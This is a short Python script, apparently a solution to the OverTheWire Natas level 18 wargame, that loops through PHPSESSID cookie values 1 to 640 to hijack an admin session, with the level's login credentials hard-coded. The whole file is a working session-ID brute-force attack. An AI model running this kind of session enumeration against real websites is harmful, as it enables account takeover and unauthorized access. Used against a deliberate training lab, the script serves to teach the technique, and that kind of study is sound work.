import requests

url="http://natas18.natas.labs.overthewire.org/"
auth=("natas18","6OG1PbKdVjyBlpxgD4DDbRG6ZLlCGgCJ")

for i in range(1,641):
    response=requests.post(url,data={"username":"admin","password":"admin"},auth=auth,cookies={"PHPSESSID":str(i)})
    if "You are an admin." in response.text:
        print(response.text)
        break